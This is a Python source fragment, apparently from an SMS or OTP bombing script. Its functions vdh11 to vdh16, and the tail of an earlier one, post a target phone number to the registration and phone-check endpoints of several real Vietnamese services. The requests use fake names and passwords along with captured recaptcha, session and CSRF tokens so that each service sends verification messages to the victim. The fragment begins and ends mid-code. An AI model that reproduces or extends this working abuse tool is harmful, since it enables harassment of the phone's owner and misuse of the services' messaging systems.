        'referer': 'https://pops.vn/auth/signin-signup/signup',
        'sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'sub-api-version': '1.1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
        'x-env': 'production',
    }

    json_data = {
        'fullName': '',
        'account': phone,
        'password': 'Hususuususue',
        'confirmPassword': 'Hususuususue',
        'recaptcha': '03AFcWeA74g59Jv7Twk34BVBc9PTmKY2DE1ck-c31uZmUeVmpO-eZLM5ly0OrqQ75Qz9OjTHjyL8TmGXYxO9qFHHAuCHpk9tMlZu9MlwEBY0gaWQBFatKNDvZoy85OjI8d7VjAxxydh6-36qF7uO8yxXGfpD-XKNc6w953flgwny9zgTQjPSmQoc61mhOGOxwls2EnIPJ3ksoJqvPqi3FBvcPc_jKJjmzsWd-Nkhs2BQ6VJeSAk5uLWCU-8OV7eaRa8sspJsjui3VxtsC1bRdAdH-MRDQvtQ2GpgX_piQZHSfZpbpfPDwCipLZQotS4SAwEOYL7YyvJH0vc6NzdTUEj5OpkXEcSmnOWubHTfQf_tBzlGFodGQp6w3fv_i0_LbXDz4UEVlJZdudLmhDxTb7W33YB2g4Qx8fmgwZcYaYH6GagDMrMXtChWVooWTAsq7EpW7ktkBi-bznP8zu9HMohT9zwynB49ftyyU9b5aG5TCdaGOGL01p9btYntMj1oRexfXsKwfrgEZMe9vAS8Rx6nUnmtK27e6-nfFUM6lkhS8EM8yr1iDib7cFpbCs16P9XWo-tU2OwvCz7DjCmM9rETWU-7McmXnJjXxOJ7ZpIsRHBKUD-IHrDzTvy_qJruUK-4Oap4YmLFZUkONUJF8iEoaXSRBnu056t1af-AEyfEf3UYMwMEUW7FAql9ekL0M1BHMWi1zOup_MAPQXN_1uinWeDA_vQHrN4fM7Z97GQJu7Vx2-rVtwUmlBpc65Ajb3Dn0wy8NXVal0g3gwpzViIpcUYWwikRgGlrGgZDbNm99oPWyZo__0HawJ5fEsEn6Ns-A-9ritRgMfBBIUrljueL4OM6Nnf-jEAg3I6Yq_0RqwMwnQ4Xa1Z1IxAaCWFFWYIH6GekZTQYvRhhjj0HDrajM9omhHNpnoB--XoFQ8ijcmWZaAH9_Uv02bJvnQyg6sz7NBh2snkLsCKUTDrI1NaB0atce1Qe6ynOqyUcVohLsagCzJvDxFMXe4mzcHCZI4ipXjmnGW95UedMw8oPKw3JRTingm58u-nZQeqKcKqTfQOs_GO8qK8kKu7urMHhADU-pX4WbS7MEzi8_w3k9AFut_qcAiUkP-jd3WWJBFKMlkNqqVraPkarFXu3Uq519PDssN1ysylBL2tAAZhgWcFHEomxizy9Z-BrqBiJUtKd3YOonj_pfXwh7l6U0TBqlz_AJWWJ8FUcJdH-kpvKMRq0vNDZOXad5CWbDCzf8OU3CKawS0JEMHHyKZxehzcC40kyT7_LoslamRE1cn1pF6BNAnFtS_3tYQuaJmLVSG1nQv8NpDk_AD4qs0ZYfPBlkwI1dkZhynG9TnfjoLJPRVv6Ta72KBZpPp8AMFgbkf0YwaIyryatGTrD1_sSA1JTrndN9XH39d_C16M6VH4w4Oq32rXNxXE1NVJDjxt-9PTIRStClIcW6hjIKmxpBjUvg6f-9VVRKCVJOeOzHxjM9CupEjOYgCyLAikqAEbbx60wnG7luzfstJWTFFSY07iVqCNbUBX0vJp0XEEAje5S9erqdtvSLcrhxOZyeZhzvB9wTGoavxdKHtVlpUA9neXXKNC8jMvcqXQE_7',
    }

    response = requests.post('https://products.popsww.com/api/v5/auths/register', cookies=cookies, headers=headers, json=json_data)
def vdh11():
    headers = {
        'authority': 'api.swift247.vn',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/json',
        'origin': 'https://app.swift247.vn',
        'referer': 'https://app.swift247.vn/',
        'sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
    }

    json_data = {
        'recaptcha_response': '03AFcWeA5SE3-vPGj6pbFcudvrQMf6Rp-0C-AfrEb5cySa0XjatM1sWJiOECUDZhynm7ShFzV4d7Lc7bvqiXZqnscFlZmhdvCXdiNCu8xLLVoX2z-Z68r4I0G4GvKRSYKpp-0nniBgVKoLpvT35OhQYBAfi-M5nAdBzhAl3XBRpeMrb8Vpag8zOyNcOcEE0hIqPvNEtRBxabG_SkkIzC2R4gjUqcyrBZQ-qCNSlmjQ3jAosknN8DdZI3B7IXB0_j0zmLVHXYXt-_sHKwfXfyToNohEaW-YCGc4nUhW1OWqafwekr4xLe3qm4BzMWV9UKdVd3h10MXIZe_8wNgRwZ9eZX2xeqIg6YMFqjUUctUulgGYPlgkoXn7r1VLMaA6ruZ8BzlmXOz_kphfAjs0ddau57uQALWq01qZCVknL0RTux1hRVZ30YmHiInLVxAKOTm94yq4hUyasnt9X1PpWfmD9cBWS_wsuQvZ3Ac8MBqBKq-S-xdwcWjhnbS8qMh7F0IZsz-Fv_OXt59hIBE1NkieJxM1kNMdUNe5M-yqMRQEBPHpHLI4OLCnUKr172hL6iZil5gjL-aI2Vyif1Li_64uwdD9ekAeUSj3dcOvuFH6U2KYD2S6iMkBcMCA_36vVJvPULejiuNpRHHFDabo7m3yYDCmjM8mchzmjrd45whixk1OH06Y3FbULPIEA_rasl2VhbxzyK67-KasOxhU3ZQxUsJh64KxiqvqnCP6wxk9oIyEXfsziPuXpW_09PX_KWxfKUfEAaXOE22gR1k6wFq6o9ZR_6iMZ6dlLIudJ4v_qBgCHN0e2ePEZkUA8ChuMbqkl056hHU7AD71GZ4w4QvcMp_B8bijVJkmt4nIJvCDGGef2LHomsg1D0S2Whq4g7egOQk-WBbafGEVJt5-VWZ6uxPZXmi3h6NOXGiMUdfQb-YmifgN4RveH_Ufyar44QaTND3cnhdUA_erXPnNJ6c45-1WV3xSgJT1mjHc0GlL40nZ2I9VW-Tlt_6a0Z2Y4TZSkQM4ulsCritKZBVdC-V9Rsliwxq8vo6H9T5rTTvHNoICBfkUX_jJtVgzpWgOcJEbHGsQuLHEStRvImxIVZGdEUzDvW8Vf92RhYEdRpKoidY_jMd8WTTodHVfqE7oclUGAxTnJO0mFWKOt3uqRY2Anje6AMIic6ctvKxbck3a8VSBoAxVtbKHIhgHAZA5rHv7JpGVxdKZZy6MkCDMA8zBbvd3zkx9dCcfxlHm0EA4DSfNRtdCE9aOGVKKGLIoHbI9gVDxgLPvef0RVzWJdd8TQ5JIMhKKsWOgrysjTvPDUx9NdhZ-vmtjEpCGTJaGeNZzdjyYCzU03VFx2uckqn8BRpG9xS885L5XeavGW4RLyLEd1hbvjdQ6yfK5t1UcCVF3TGuiOpO_KuD4RMKCZB0KN0yIxisgoh4tSQTfra3WwylcTPqpkWifmkXxmfBtxp0e4apU5sPoK1JW8k5HyywQsYxnY_-3tH6FfHZ_wqar63MNu5WPiq0VTnS1AFxwOxuWDcbxBGynH7g7yz1dx_dey8-XCzGcgqLLo56vuf0g18xxfZ9M50wYEQknIHaiJk0YDhA-RJfKws_8',
        'phone': phone,
    }

    response = requests.post('https://api.swift247.vn/v1/check_phone', headers=headers, json=json_data)

def vdh12():
    headers = {
        'authority': 'api.ahamove.com',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/json;charset=UTF-8',
        'origin': 'https://app.ahamove.com',
        'referer': 'https://app.ahamove.com/',
        'sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
    }

    json_data = {
        'mobile': phone,
        'name': 'NGUYEN',
        'email': 'hudhefhhefgye@gmail.com',
        'country_code': 'VN',
        'firebase_sms_auth': 'true',
        'time': 1697123218,
        'checksum': 'DGU+IbOqEJ6K+JBJ7gUZpST5P2eQbiqsguWKVw8WgdvNbCwp0sHa4rq8+v2SE459AabzC1GcadmkFkgAfsUD82rKhJFG9eueCaGaBKQB0Ug52T8/bVWsHFZ5hDvHqNf5Js2XhFu+bFNI/qarh3fSZq2FUDvB3NZ2x42nSM7yyhH993p9gFKGog/bcVgbehVYZ0MH/LUZABiPOt5W7EbIekW75OGA4UbOJkliG0KWOunwORQIswasaVF4PV70IjGkTPPjMfbHj3zHiA1ob6pNf9Djf9qfKI2gp47vXKsXmQAgJrldUeWoq19O+RuUdTrcTlLWTSwR5htUFw+i1FvwdQ==',
    }

    response = requests.post('https://api.ahamove.com/api/v3/public/user/register', headers=headers, json=json_data)
def vdh13():
    cookies = {
        '_gid': 'GA1.2.1933755445.1697123307',
        '_gat_UA-230801217-1': '1',
        '_ym_uid': '1697123310666346398',
        '_ym_d': '1697123310',
        '_ga': 'GA1.2.1960886054.1697123307',
        '_ym_isad': '2',
        '_ga_LN0QPGLCB5': 'GS1.2.1697123307.1.1.1697123312.0.0.0',
        '_ym_visorc': 'w',
        '_ga_LBS7YCVKY6': 'GS1.1.1697123307.1.1.1697123313.54.0.0',
        '_fw_crm_v': 'e64f3b50-86d3-4983-c307-9724dd35f021',
    }

    headers = {
        'authority': 'api.thantaioi.vn',
        'accept': '*/*',
        'accept-language': 'vi',
        'content-type': 'application/json',
        # 'cookie': '_gid=GA1.2.1933755445.1697123307; _gat_UA-230801217-1=1; _ym_uid=1697123310666346398; _ym_d=1697123310; _ga=GA1.2.1960886054.1697123307; _ym_isad=2; _ga_LN0QPGLCB5=GS1.2.1697123307.1.1.1697123312.0.0.0; _ym_visorc=w; _ga_LBS7YCVKY6=GS1.1.1697123307.1.1.1697123313.54.0.0; _fw_crm_v=e64f3b50-86d3-4983-c307-9724dd35f021',
        'origin': 'https://thantaioi.vn',
        'referer': 'https://thantaioi.vn/user/registration/reg1',
        'sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
    }

    json_data = {
        'full_name': 'VI VAN QUANG',
        'first_name': 'QUANG',
        'last_name': 'VI',
        'middle_name': 'VAN',
        'mobile_phone': phone,
        'target_url': 'https://thantaioi.vn/?utm_source=direct&utm_medium=direct&utm_campaign=direct',
    }

    response = requests.post('https://api.thantaioi.vn/api/user', cookies=cookies, headers=headers, json=json_data)
def vdh14():
    cookies = {
        'wordpress_google_apps_login': 'ab7c0953e66035e4024a933f9028a39d',
        'PHPSESSID': 'qq82ca2fl29q3nuseg7dnppms4',
        'leadCollection': 'show',
        '_gcl_au': '1.1.633591068.1697123451',
        '__sbref': 'lvfxsblneiicnurlniutdqssqaxhjnlcxhoivxcl',
        '_ga': 'GA1.1.399073766.1697123452',
        '_ga': 'GA1.4.399073766.1697123452',
        '_gid': 'GA1.4.1143546190.1697123452',
        '_fbp': 'fb.2.1697123452056.1279164642',
        '_tt_enable_cookie': '1',
        '_ttp': '5AN9dda0HCel9_mL7W1FwPwyFcD',
        'gaVisitorUuid': 'db6fbfb6-4b40-43ab-a031-ee8104b510d0',
        '__hstc': '162740643.e6fb585f1d045f653646e38487c936ac.1697123459686.1697123459686.1697123459686.1',
        'hubspotutk': 'e6fb585f1d045f653646e38487c936ac',
        '__hssrc': '1',
        '_ga_5658QBW6NK': 'GS1.1.1697123451.1.1.1697123597.18.0.0',
        '_ga_9SNWXSF2JF': 'GS1.1.1697123457.1.1.1697123599.0.0.0',
        '__hssc': '162740643.2.1697123459686',
        '_ga_HHFQLKZ84Q': 'GS1.1.1697123451.1.1.1697123627.53.0.0',
    }

    headers = {
        'authority': 'daihoc.fpt.edu.vn',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        # 'cookie': 'wordpress_google_apps_login=ab7c0953e66035e4024a933f9028a39d; PHPSESSID=qq82ca2fl29q3nuseg7dnppms4; leadCollection=show; _gcl_au=1.1.633591068.1697123451; __sbref=lvfxsblneiicnurlniutdqssqaxhjnlcxhoivxcl; _ga=GA1.1.399073766.1697123452; _ga=GA1.4.399073766.1697123452; _gid=GA1.4.1143546190.1697123452; _fbp=fb.2.1697123452056.1279164642; _tt_enable_cookie=1; _ttp=5AN9dda0HCel9_mL7W1FwPwyFcD; gaVisitorUuid=db6fbfb6-4b40-43ab-a031-ee8104b510d0; __hstc=162740643.e6fb585f1d045f653646e38487c936ac.1697123459686.1697123459686.1697123459686.1; hubspotutk=e6fb585f1d045f653646e38487c936ac; __hssrc=1; _ga_5658QBW6NK=GS1.1.1697123451.1.1.1697123597.18.0.0; _ga_9SNWXSF2JF=GS1.1.1697123457.1.1.1697123599.0.0.0; __hssc=162740643.2.1697123459686; _ga_HHFQLKZ84Q=GS1.1.1697123451.1.1.1697123627.53.0.0',
        'referer': 'https://daihoc.fpt.edu.vn/tuyen-sinh-dh-fpt/',
        'sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
    }

    params = {
        'mobile': phone,
    }

    response = requests.get(
        'https://daihoc.fpt.edu.vn/user/xac-thuc-so-dien-thoai.php',
        params=params,
        cookies=cookies,
        headers=headers,
    )
def vdh15():
    cookies = {
        '_fbp': 'fb.1.1697123737881.73338682',
        '_gid': 'GA1.2.1780838614.1697123738',
        '_gat_gtag_UA_45094808_5': '1',
        'cf_clearance': 'Opgg1JHIUiGBiHxgPVL6fYk4xoqWy3di4T27f8yEpX0-1697123740-0-1-9e45bc70.ad577c4c.c944e390-0.2.1697123740',
        'XSRF-TOKEN': 'eyJpdiI6IlwvXC85RDJaSTdNUzNDNUk1K05MaDhQQT09IiwidmFsdWUiOiJGaG90YmNDaDduNXRhbENxOVZpeGM4SU9cL01qeWgxNEFSanRnNlBcL0FQc1lGWDRZWXJveWpuUnc2WU95WnJySUMiLCJtYWMiOiI4MWI1MzkwMGYxZjFjYWQyY2RiYWY1ODNkMTQ4NmYyODdmYjMxMmNjMDJjZTUyM2NlMGNiYzljMDJmYjAyZDA2In0%3D',
        'laravel_session': 'eyJpdiI6Ikd2cGNWVjl4cXQ4TUtPK3luelVcL2tBPT0iLCJ2YWx1ZSI6IlZGZVpubm9MU1EyQ3NGWWluamF0dW5aa2w3SCtBcHZKbHBybk1KOExzZ2NvWTdMNDZTZjhad1FUc1RFRXZkQ00iLCJtYWMiOiJkYWQwOWE4MzMzODAxM2RlMDYwNDk3MDI4MTUzMzdmNWMxZmQwNzEwNWRiYzNjNzRlM2ZkNmZiMjE4ODQwNjQzIn0%3D',
        '_ga': 'GA1.2.1343231361.1697123738',
        '_ga_D70VFMWRGM': 'GS1.1.1697123737.1.1.1697123750.47.0.0',
        '_gcl_au': '1.1.1005789738.1697123760',
    }

    headers = {
        'authority': 'nhadat.cafeland.vn',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': '_fbp=fb.1.1697123737881.73338682; _gid=GA1.2.1780838614.1697123738; _gat_gtag_UA_45094808_5=1; cf_clearance=Opgg1JHIUiGBiHxgPVL6fYk4xoqWy3di4T27f8yEpX0-1697123740-0-1-9e45bc70.ad577c4c.c944e390-0.2.1697123740; XSRF-TOKEN=eyJpdiI6IlwvXC85RDJaSTdNUzNDNUk1K05MaDhQQT09IiwidmFsdWUiOiJGaG90YmNDaDduNXRhbENxOVZpeGM4SU9cL01qeWgxNEFSanRnNlBcL0FQc1lGWDRZWXJveWpuUnc2WU95WnJySUMiLCJtYWMiOiI4MWI1MzkwMGYxZjFjYWQyY2RiYWY1ODNkMTQ4NmYyODdmYjMxMmNjMDJjZTUyM2NlMGNiYzljMDJmYjAyZDA2In0%3D; laravel_session=eyJpdiI6Ikd2cGNWVjl4cXQ4TUtPK3luelVcL2tBPT0iLCJ2YWx1ZSI6IlZGZVpubm9MU1EyQ3NGWWluamF0dW5aa2w3SCtBcHZKbHBybk1KOExzZ2NvWTdMNDZTZjhad1FUc1RFRXZkQ00iLCJtYWMiOiJkYWQwOWE4MzMzODAxM2RlMDYwNDk3MDI4MTUzMzdmNWMxZmQwNzEwNWRiYzNjNzRlM2ZkNmZiMjE4ODQwNjQzIn0%3D; _ga=GA1.2.1343231361.1697123738; _ga_D70VFMWRGM=GS1.1.1697123737.1.1.1697123750.47.0.0; _gcl_au=1.1.1005789738.1697123760',
        'origin': 'https://nhadat.cafeland.vn',
        'referer': 'https://nhadat.cafeland.vn/dang-ky.html',
        'sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'phoneNumber': phone,
        '_token': 'ntVFKy0yOfWu1B0vY5akhz7pFXd3VAwssKuVJC6v',
    }

    response = requests.post('https://nhadat.cafeland.vn/register-check-by-phone/', cookies=cookies, headers=headers, data=data)
def vdh16():
    cookies = {
        '_ttsid': '97a04ce8ad32bf8aaa3c3fabf802a8e935adf2f02e290bca31083a230718783c',
        '_gid': 'GA1.2.118421035.1697123940',
        '_gat_UA-46730129-1': '1',
        '__sts': 'eyJzaWQiOjE2OTcxMjM5NDAzOTYsInR4IjoxNjk3MTIzOTQwMzk2LCJ1cmwiOiJodHRwcyUzQSUyRiUyRnNzby50dW9pdHJlLnZuJTJGbG9naW4iLCJwZXQiOjE2OTcxMjM5NDAzOTYsInNldCI6MTY5NzEyMzk0MDM5Nn0=',
        '__stp': 'eyJ2aXNpdCI6Im5ldyIsInV1aWQiOiI5ZjNjZGMzYS1hZGE5LTQzZDYtYmIyYi0wZDM1NTQ0OWU0ODIifQ==',
        '_ga': 'GA1.1.1077117542.1697123940',
        '__stgeo': 'IjAi',
        '__stbpnenable': 'MQ==',
        '__stdf': 'MA==',
        '_ga_8KQ37P0QJM': 'GS1.1.1697123940.1.1.1697123960.40.0.0',
        'XSRF-TOKEN': 'eyJpdiI6InBhV212MjJKb0tFWC9OMjRJQS9XY2c9PSIsInZhbHVlIjoiWlJtdDRqcWE4Tlo3RnZQajJWVThFTTlXbm1BYkZtZU9VWUtCK1ZTWlpVVHBQNldVVXQ1SHVZMUJVbktYT2NSSVFwSDErNlkyLzk0bmFPMFlHM3l3Znp4a3FkQmFDTnRNdGpaa0oremExWXFzeEVwd09kTndhZlJoZ084MlY2ZE8iLCJtYWMiOiJhZjIxNjVmNjk2MWJmOTdhY2I1NTE2MTBiOTE4NGFlYWFkNTYyYjZjNjdhZGVmNDE5YjhhZjdiMGQ5ZDgxNDlhIiwidGFnIjoiIn0%3D',
        'SSO_SID': 'eyJpdiI6ImxjdXF1NWRRa0U2dkg1UUdJM3Y4Tmc9PSIsInZhbHVlIjoiZEV1TmMwQUtPMDc1Z1Axakl2eTB3QllYcnFCQkhHcjd4OTZESzl6amRqN3FBYVh5bHpZVHlFUEh3L1ZxbHFoYnJwTGxFK1hXSEUxamJQNTh5dFFlSWVmSHJBUE1uQ1ZNVFpsY29uclFwall0dVE4NCtWT042OFowdkJzZTJVZDAiLCJtYWMiOiI1NWU0ZDJhZDZiZmY5NjZiZDVlNWI0ZjQ5MWUwZGY5NDFlZmZiZmQ1MjFjNzg4ZjQyNWZkMGZmODRhNTNjZDRlIiwidGFnIjoiIn0%3D',
    }

    headers = {
        'authority': 'sso.tuoitre.vn',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryslAwQvBBdWAJsg2D',
        # 'cookie': '_ttsid=97a04ce8ad32bf8aaa3c3fabf802a8e935adf2f02e290bca31083a230718783c; _gid=GA1.2.118421035.1697123940; _gat_UA-46730129-1=1; __sts=eyJzaWQiOjE2OTcxMjM5NDAzOTYsInR4IjoxNjk3MTIzOTQwMzk2LCJ1cmwiOiJodHRwcyUzQSUyRiUyRnNzby50dW9pdHJlLnZuJTJGbG9naW4iLCJwZXQiOjE2OTcxMjM5NDAzOTYsInNldCI6MTY5NzEyMzk0MDM5Nn0=; __stp=eyJ2aXNpdCI6Im5ldyIsInV1aWQiOiI5ZjNjZGMzYS1hZGE5LTQzZDYtYmIyYi0wZDM1NTQ0OWU0ODIifQ==; _ga=GA1.1.1077117542.1697123940; __stgeo=IjAi; __stbpnenable=MQ==; __stdf=MA==; _ga_8KQ37P0QJM=GS1.1.1697123940.1.1.1697123960.40.0.0; XSRF-TOKEN=eyJpdiI6InBhV212MjJKb0tFWC9OMjRJQS9XY2c9PSIsInZhbHVlIjoiWlJtdDRqcWE4Tlo3RnZQajJWVThFTTlXbm1BYkZtZU9VWUtCK1ZTWlpVVHBQNldVVXQ1SHVZMUJVbktYT2NSSVFwSDErNlkyLzk0bmFPMFlHM3l3Znp4a3FkQmFDTnRNdGpaa0oremExWXFzeEVwd09kTndhZlJoZ084MlY2ZE8iLCJtYWMiOiJhZjIxNjVmNjk2MWJmOTdhY2I1NTE2MTBiOTE4NGFlYWFkNTYyYjZjNjdhZGVmNDE5YjhhZjdiMGQ5ZDgxNDlhIiwidGFnIjoiIn0%3D; SSO_SID=eyJpdiI6ImxjdXF1NWRRa0U2dkg1UUdJM3Y4Tmc9PSIsInZhbHVlIjoiZEV1TmMwQUtPMDc1Z1Axakl2eTB3QllYcnFCQkhHcjd4OTZESzl6amRqN3FBYVh5bHpZVHlFUEh3L1ZxbHFoYnJwTGxFK1hXSEUxamJQNTh5dFFlSWVmSHJBUE1uQ1ZNVFpsY29uclFwall0dVE4NCtWT042OFowdkJzZTJVZDAiLCJtYWMiOiI1NWU0ZDJhZDZiZmY5NjZiZDVlNWI0ZjQ5MWUwZGY5NDFlZmZiZmQ1MjFjNzg4ZjQyNWZkMGZmODRhNTNjZDRlIiwidGFnIjoiIn0%3D',
        'origin': 'https://sso.tuoitre.vn',
        'referer': 'https://sso.tuoitre.vn/login',
        'sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
        'x-csrf-token': '11vElCPAuH1yyvQ7jJSvWPw2wLlhe6bi3QmUavfp',
        'x-requested-with': 'XMLHttpRequest',
        'x-xsrf-token': 'eyJpdiI6InBhV212MjJKb0tFWC9OMjRJQS9XY2c9PSIsInZhbHVlIjoiWlJtdDRqcWE4Tlo3RnZQajJWVThFTTlXbm1BYkZtZU9VWUtCK1ZTWlpVVHBQNldVVXQ1SHVZMUJVbktYT2NSSVFwSDErNlkyLzk0bmFPMFlHM3l3Znp4a3FkQmFDTnRNdGpaa0oremExWXFzeEVwd09kTndhZlJoZ084MlY2ZE8iLCJtYWMiOiJhZjIxNjVmNjk2MWJmOTdhY2I1NTE2MTBiOTE4NGFlYWFkNTYyYjZjNjdhZGVmNDE5YjhhZjdiMGQ5ZDgxNDlhIiwidGFnIjoiIn0=',
    }

    data = '------WebKitFormBoundaryslAwQvBBdWAJsg2D\r\nContent-Disposition: form-data; name="hiddenBackUrl"\r\n\r\nhttp://sso.tuoitre.vn\r\n------WebKitFormBoundaryslAwQvBBdWAJsg2D\r\nContent-Disposition: form-data; name="username"\r\n\r\n{phone}\r\n------WebKitFormBoundaryslAwQvBBdWAJsg2D\r\nContent-Disposition: form-data; name="password"\r\n\r\nhdueggytydg45G\r\n------WebKitFormBoundaryslAwQvBBdWAJsg2D\r\nContent-Disposition: form-data; name="g-recaptcha-response"\r\n\r\n03AFcWeA4lGMabsw-yeX837SKdpf8GBdBmfSS7MirNOYtE7GsXjzyKADswRrAyc7oiY-uHDmggK32ntucgN4Uy-cDHo2ltZCQyqKtmAHT-L4S73x3ngGJGSMnl0OQ4EzWqtzzASV0Bs75Rj7OMBazlWGFZNuIzcPlRAFZVTDNfFk7C2VYtpssqBGNBQ0XjLphHlcWeDfUQn1LuBsNEp7oYiN24touyR1kNf-dcDUa9mzMlMhOJ_wblB_kn8cCpmDJkMecK7jg4U3Kf4WEsQdCOYindIueTlkV606_17PhnuxDJn6XQIxXy7yUBODQ8YhmzLwa0MCemYYfrz8uAFVSG7QdwsuaH2jBuMlEQv9AFfDR-yw9EzWQ7thwsm7jSW_Li2z0TA3H80Mj4QLeHLEHYVQ5kgroCSPlw0akK_uhCG7g-PfXIoa8xdW8hH9UuRqwY6dZsbk7TE1ilj6w6hnV2RTxQhejOWz7s0FuOdfqV7icxeMqGe2swlsUgEc9iFvf7bei1i0i71_CPQ-71Wk88N4-CCGce7mtUBWMjcDK5Fumjkdki3t80_kCuqFYwTNYMDbuIgCM-JVPnx5lDCch6lhhbxMYZNlqPen0jK8FtSUkKYd5GL64oDoiqdShphBR1VQEjSRQaU_Qbsl8j3GlVEcykVpE2IA2JrZBH9nEFEskCwy3b1PnX_MVkowI_XZNxu7a3F8646Ja81CKrlc95fPFDJ01nHafmbbhdY-qpSj8LBqpfDUMMsQAzooVYoMzsL3ezftB04lVqYIphoNyXWJxTY6lCDAr2nTyJycHcXCaBLyA7u9tfAsG0l59KJOc3fw2FYovsVYGjtPRme7L3HimSx-nADhStCZs2yJL9U4O9VBhyofjjICM-vNMzEsgSMtdh226vqDe-zw2vwI1liE1pH-tWeMXUi7nTB8Vt8VXBVJdh1WhusXQldqbFpcaxGAM3uVJZpHnrCX0SSkSJZQibxC-t9XZOqH284qSi8-RMp6nT8mVOp-ZN6BfuBbqLyLzgYuGe8M0UNjT6A-tipz9-BXieKJGawaAsuFMdWW7Gfz173-nxi7L_RYdLK2tXy1cNU1rZpxnOStIE1MrIvfRM1Dq0hi-BvLTSx5_X_Q96ONWH-YuNM-hIn5A5CS2Q6DZRjqUBi1GiRcLSDNaJSB6cE1ah3IzX496CyINf1SBD08TdhrELi0--5CgmHVs6jWOFqFoZCIHZH6bhILHaciCjG5GdOeViE3D3maP4m0ovC6b3sHMVHkGIedzMB7kE63lNp6IyG0DyYTxIjgMlZSJ2oLx9G2nMcd5MFfra_qHkFSy9hk397EdEVc2CDq7NlTuLNbZlat6iKgFMepFz-XrFRe4Y9dvcWPXyrTiKzQuNB3SxgNFLMv7v3YYPRFU6TRJWqyUWnReM_BDa4KXbg2GWyzvZ8d2e6p-R_3NC53j5G0sq46FZV3HNLhpi6vNBQslwOPVBMM0UQxxx_PikCtBnQ4MwrT2Q2u-cqWw_5MRF7FcLoW9aWrdcmGR2moa8I9RbNXrb99EwgcEBMSO2WojN4qILTX96UDOhnOpAseZzE-OuYBxzT1Mxk8oownU2yjnKVxuIl17E3HE5trpe86Jd6Fl89Vy981GIv_-8W6HDxY-G1tDTmjE\r\n------WebKitFormBoundaryslAwQvBBdWAJsg2D\r\nContent-Disposition: form-data; name="state"\r\n\r\n\r\n------WebKitFormBoundaryslAwQvBBdWAJsg2D\r\nContent-Disposition: form-data; name="backUrl"\r\n\r\nhttps://sso.tuoitre.vn/register-success\r\n------WebKitFormBoundaryslAwQvBBdWAJsg2D\r\nContent-Disposition: form-data; name="userAgent"\r\n\r\nMozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 